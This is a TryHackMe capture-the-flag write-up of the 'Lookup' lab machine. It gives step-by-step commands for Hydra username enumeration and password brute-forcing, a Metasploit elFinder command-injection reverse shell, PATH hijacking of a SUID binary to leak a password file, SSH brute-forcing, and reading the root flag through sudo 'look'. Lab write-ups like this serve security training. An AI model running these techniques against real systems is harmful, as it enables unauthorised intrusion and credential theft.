Written By Aryan Giri

# TryHackMe Lookup — From Username Enumeration to Root

The TryHackMe **Lookup** room is a Linux-based penetration-testing lab focused on web enumeration, username enumeration, password attacks, command injection, SUID-based privilege escalation, PATH hijacking, and abusing a misconfigured `sudo` permission.

The complete attack chain used in this write-up is:

```text
HTTP
  │
  ├── Username enumeration
  │       │
  │       └── Password brute force
  │               │
  │               └── Authenticated access
  │                       │
  │                       └── elFinder
  │                               │
  │                               └── Command Injection
  │                                       │
  │                                       └── www-data shell
  │                                               │
  │                                               └── SUID pwm
  │                                                       │
  │                                                       └── PATH Hijacking
  │                                                               │
  │                                                               └── .passwords
  │                                                                       │
  │                                                                       └── SSH as think
  │                                                                               │
  │                                                                               └── sudo look
  │                                                                                       │
  │                                                                                       └── Root flag
```

## Reconnaissance

I started with a basic service-version scan against the target.

```bash
nmap -sV <IP>
```

<img width="630" height="227" alt="Screenshot 2026-08-30 172554" src="https://github.com/user-attachments/assets/86e70212-ad04-44ce-accc-2b2cfc4dc2e6" />


The scan revealed two interesting open ports:

```text
22/tcp  open  ssh
80/tcp  open  http
```

Port 22 exposes SSH, while port 80 hosts the web application.

## Web Enumeration

When visiting the target directly through its IP address, the web server redirects to:

```text
http://lookup.thm
```

This indicates that the application expects the `lookup.thm` hostname.

I added the hostname to `/etc/hosts`:

```bash
sudo nano /etc/hosts
```

Then added:

```text
<IP> lookup.thm
```

Alternatively:

```bash
echo "<IP> lookup.thm" | sudo tee -a /etc/hosts
```

I could then access:

```text
http://lookup.thm
```

The site presented a login form.

<img width="895" height="719" alt="Screenshot 2026-08-30 172920" src="https://github.com/user-attachments/assets/3e580d91-10b1-4b9f-9d11-6f6c11204ef0" />


## Username Enumeration

Instead of immediately launching a password attack, I first tested the application's response to invalid credentials.

For example, I submitted fictional credentials:

```text
Username: test
Password: test
```

<img width="854" height="498" alt="Screenshot 2026-08-30 172937" src="https://github.com/user-attachments/assets/a6307b42-9b5a-4d03-ae62-3f58eaac06e9" />


The application responded with:

```text
Wrong username or password. Please try again.
```

This becomes interesting when testing different usernames.

A common web-enumeration weakness occurs when an application gives a different response depending on whether the supplied username exists. If the username is valid but the password is incorrect, the response may differ from the response for a completely invalid username.

To understand the request properly, I intercepted the login request with Burp Suite.

<img width="744" height="477" alt="Screenshot 2026-08-30 173057" src="https://github.com/user-attachments/assets/51816815-161d-41d3-8377-ca84c040d2d3" />


The request contained two parameters:

```text
username
password
```

The request structure was effectively:

```text
POST /login.php
username=<username>&password=<password>
```

This gave us everything required to automate username enumeration.

## Brute-Forcing Valid Usernames

I used Hydra to test usernames while keeping the password fixed to a dummy value.

```bash
hydra -L /usr/share/seclists/Usernames/Names/names.txt \
-p test \
lookup.thm \
http-post-form \
"/login.php:username=^USER^&password=^PASS^:Wrong username or password. Please try again."
```

Here:

* `-L` supplies the username wordlist.
* `-p test` uses a fixed password.
* `http-post-form` tells Hydra to attack an HTTP POST form.
* `^USER^` is replaced with each username.
* `^PASS^` is replaced with the supplied password.
* The final string is the failure condition.

<img width="627" height="328" alt="Screenshot 2026-08-30 182837" src="https://github.com/user-attachments/assets/b26e1e05-5af1-481e-92cb-9dd8e9de3e70" />


The results identified usernames including:

```text
admin
jose
```

The password `test` was not actually valid. These were useful because the application's responses allowed us to distinguish valid usernames from invalid ones.

## Brute-Forcing the Admin Password

I first attempted to brute-force the `admin` account using `rockyou.txt`:

```bash
hydra -l admin \
-P /usr/share/wordlists/rockyou.txt \
lookup.thm \
http-post-form \
"/login.php:username=^USER^&password=^PASS^:Wrong username or password. Please try again."
```

<img width="630" height="306" alt="Screenshot 2026-08-30 183258" src="https://github.com/user-attachments/assets/39e82e62-4891-44d6-92fa-b7ca09fc90bb" />


Hydra reported a password, but manually testing it showed that it was a false positive.

This is an important lesson when using automated password attacks: a tool's output is only as reliable as the failure condition supplied to it. If the application has unusual responses, redirects, or other behavior, Hydra can misinterpret a response as a successful login.

## Brute-Forcing the `jose` Account

I then repeated the attack against `jose`:

```bash
hydra -l jose \
-P /usr/share/wordlists/rockyou.txt \
lookup.thm \
http-post-form \
"/login.php:username=^USER^&password=^PASS^:Wrong username or password. Please try again."
```


<img width="637" height="314" alt="Screenshot 2026-08-30 183244" src="https://github.com/user-attachments/assets/20c99fbc-1117-490c-a200-98247f2b92ed" />


This time, the discovered password worked.

Interestingly, the password was also associated with the earlier `admin` result, but it did not authenticate successfully as `admin`. This demonstrates why credentials reported by brute-force tools should always be manually verified.

After authenticating as `jose`, the application redirected me to another virtual host:

```text
files.lookup.thm
```

<img width="284" height="50" alt="Screenshot 2026-08-30 183506" src="https://github.com/user-attachments/assets/5bced1a1-4887-48f1-99e7-24aca6a6e5a9" />

## Enumerating `files.lookup.thm`

I added the new virtual host to `/etc/hosts`:

```text
<IP> lookup.thm files.lookup.thm
```

The authenticated page exposed **elFinder**, a web-based file manager.

<img width="1498" height="808" alt="Screenshot 2026-08-30 190506" src="https://github.com/user-attachments/assets/7b7e2a42-7bd6-444f-803f-961f903509ea" />


If the page does not render correctly while using Burp Suite, disable the HTTP proxy temporarily and access the application directly.

elFinder provides functionality for browsing and managing files through a web interface.

I then looked for version information by using the application's information/help interface.

<img width="689" height="550" alt="Screenshot 2026-08-30 190948" src="https://github.com/user-attachments/assets/be41589a-a1dd-4e0e-918c-28f2605f6432" />


The installed version was:

```text
elFinder 2.1.47
```

This version was interesting because public exploit information exists for an **Exiftran command injection** affecting the PHP connector.

## Exploiting elFinder

I checked the available Metasploit modules:

```bash
msfconsole
```

Then:

```text
search elFinder
```

One of the relevant modules was:

```text
exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection
```

I inspected the module:

```text
info exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection
```

Then selected it:

```text
use exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection
```

<img width="624" height="125" alt="Screenshot 2026-08-30 202317" src="https://github.com/user-attachments/assets/9a20b452-de11-4cb8-badc-12fd47e2df59" />


I configured the required options:

```text
set LHOST <YOUR_IP>
set RHOSTS upload.lookup.thm
```

The module's default listener port was `4444`.

To inspect all available options:

```text
show options
```

I then launched the exploit:

```text
run
```

or:

```text
exploit
```

<img width="625" height="397" alt="Screenshot 2026-08-30 202555" src="https://github.com/user-attachments/assets/06d823f7-0f4c-4df5-871b-a0b8112897d8" />


The exploit provided a shell on the target.

## Getting a More Usable Shell

The initial shell was very limited, so I upgraded it to a more interactive Bash shell using Python:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

<img width="582" height="68" alt="Screenshot 2026-09-03 120029" src="https://github.com/user-attachments/assets/5af18ea8-3ea5-45fc-94d3-a3e9a0e306ed" />


At this point, I had command execution as:

```text
www-data
```

## Post-Exploitation Enumeration

I started looking around the filesystem.

```bash
cd /home
ls
```

A user named `think` was present.

I inspected the directory:

```bash
ls -la /home/think
```

Among the files was:

```text
user.txt
```

However, as `www-data`, I did not have permission to read the flag.


There was also an interesting hidden file:

```text
.passwords
```

This looked potentially useful, but it was not readable directly by `www-data`.

Instead of stopping there, I started looking for privilege-escalation opportunities.

## Finding SUID Binaries

I searched the filesystem for SUID binaries:

```bash
find / -perm -4000 -type f 2>/dev/null
```

There were several standard SUID binaries, but one unusual binary stood out:

```text
/usr/sbin/pwm
```

Running it produced an interesting message indicating that it attempted to execute `id` and then look for a `.passwords` file belonging to the detected user.

The important observation was that the binary was not simply reading `/home/think/.passwords` directly.

I needed to understand what it was actually doing.

## Investigating `pwm` with `strace`

The compromised machine already had `strace`, so I used it to trace process execution:

```bash
strace -f -e execve /usr/sbin/pwm 2>&1
```

<img width="812" height="404" alt="Screenshot 2026-09-03 122340" src="https://github.com/user-attachments/assets/d96b4d18-ed2c-4146-a803-1592fb1a7286" />


The trace revealed execution similar to:

```text
execve("/bin/sh", ["sh", "-c", "id"], ...)
execve("/usr/bin/id", ["id"], ...)
```

The important part was that `pwm` was invoking `id` through the shell rather than relying on a hard-coded path inside the original command.

This suggested a potential **PATH hijacking** opportunity.

If we can control the `PATH` used by the SUID program, we can potentially make it execute our own `id` program.

## PATH Hijacking

I moved to `/tmp`, where I could create files:

```bash
cd /tmp
```

Because the environment was limited and `nano` was unavailable, I created a fake `id` command directly with `cat`:

```bash
cat > id <<'EOF'
#!/bin/bash
echo "uid=33(think) gid=33(www-data) groups=33(www-data)"
EOF
```

Then made it executable:

```bash
chmod +x id
```

The goal was to make `pwm` believe that the current user was `think`.

I prepended `/tmp` to the `PATH`:

```bash
export PATH=/tmp:$PATH
```
<img width="662" height="354" alt="Screenshot 2026-09-03 122615" src="https://github.com/user-attachments/assets/c1e140dd-2941-45f9-b2e7-c68831025473" />


I verified the modified value:

```bash
echo $PATH
```


Now when `pwm` attempted to execute:

```text
id
```

the shell would search `/tmp` first and find our fake executable.

I ran:

```bash
/usr/sbin/pwm
```

This caused `pwm` to believe that the current user was `think` and resulted in the contents of:

```text
/home/think/.passwords
```

being disclosed.

<img width="795" height="414" alt="Screenshot 2026-09-03 122817" src="https://github.com/user-attachments/assets/0f37a69d-57bb-4d30-83e0-a53c5d893b2d" />


This was the key transition from the `www-data` shell to obtaining credentials for the `think` account.

## SSH Password Attack Against `think`

I copied the recovered password list to my attacker machine and saved it as:

```text
think.txt
```

I then used Hydra against SSH:

```bash
hydra -l think -P think.txt ssh://lookup.thm
```

<img width="821" height="373" alt="Screenshot 2026-09-03 123353" src="https://github.com/user-attachments/assets/b463b602-1dd2-4631-af05-0f6f70c9affd" />


Hydra identified the valid password for the `think` account.

I then connected through SSH:

```bash
ssh think@lookup.thm
```

After entering the recovered password, I obtained an interactive SSH session as `think`.

<img width="820" height="537" alt="Screenshot 2026-09-03 175033" src="https://github.com/user-attachments/assets/8d292709-ddcd-43b1-b8a5-320208cfab13" />


## User Flag

I checked the user's home directory:

```bash
cd /home/think
ls
```

Then read the user flag:

```bash
cat user.txt
```

<img width="738" height="140" alt="Screenshot 2026-09-03 175058" src="https://github.com/user-attachments/assets/fa480d18-0189-4e2d-82dc-072aafaca0ea" />


The flag is intentionally omitted from this write-up.

At this point, the user-level portion of the machine was complete.

## Privilege Escalation: `sudo -l`

Next, I checked which commands the `think` user could execute with elevated privileges:

```bash
sudo -l
```

After entering the `think` user's password, the output showed that `think` could execute:

```text
/usr/bin/look
```

with `sudo`.

<img width="814" height="236" alt="Screenshot 2026-09-03 175207" src="https://github.com/user-attachments/assets/bf909f8c-702d-415f-b5a5-55102dec3265" />


`look` was unfamiliar to me as a privilege-escalation primitive, so I checked its known GTFOBins technique.

The important behavior is that `look` can be supplied with an empty search string and a file as its dictionary argument, allowing it to output the contents of that file.

The relevant syntax is:

```bash
look '' /path/to/input-file
```

## Reading the Root Flag with `look`

Because `think` could execute `look` as root, I used:

```bash
sudo look '' /root/root.txt
```

<img width="583" height="220" alt="Screenshot 2026-09-03 175757" src="https://github.com/user-attachments/assets/edc96d5a-3b29-4c50-b44f-d0f7bc9290ce" />


This allowed the root-owned flag to be read without needing a conventional root shell.

The root flag is intentionally omitted from this write-up.

## Attack Chain

The complete exploitation path was:

```text
Port 80
    │
    └── lookup.thm
          │
          └── Login form
                │
                └── Username enumeration
                      │
                      └── Valid users: admin / jose
                            │
                            └── Password brute force
                                  │
                                  └── jose credentials
                                        │
                                        └── files.lookup.thm
                                              │
                                              └── elFinder 2.1.47
                                                    │
                                                    └── Exiftran command injection
                                                          │
                                                          └── www-data
                                                                │
                                                                └── SUID /usr/sbin/pwm
                                                                      │
                                                                      └── strace analysis
                                                                            │
                                                                            └── PATH hijacking
                                                                                  │
                                                                                  └── /home/think/.passwords
                                                                                        │
                                                                                        └── SSH brute force
                                                                                              │
                                                                                              └── think
                                                                                                    │
                                                                                                    └── sudo -l
                                                                                                          │
                                                                                                          └── /usr/bin/look
                                                                                                                │
                                                                                                                └── /root/root.txt
```

The room demonstrates how several individually small weaknesses can be chained together into full compromise: information leakage during authentication, weak credentials, a vulnerable file-management component, command injection, an unsafe SUID binary, PATH hijacking, credential reuse, and finally an overly permissive `sudo` rule.

The official TryHackMe room describes Lookup as a machine covering reconnaissance, hidden services and subdomains, command injection, automation, and privilege escalation.
